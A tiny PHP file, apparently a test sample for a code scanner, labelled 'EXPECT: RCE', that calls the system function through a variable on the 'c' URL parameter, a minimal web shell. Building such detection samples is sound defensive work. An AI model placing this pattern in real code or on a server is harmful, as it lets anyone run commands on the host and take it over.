<?php
// EXPECT: RCE
$fn = 'system';
$fn($_GET['c']);
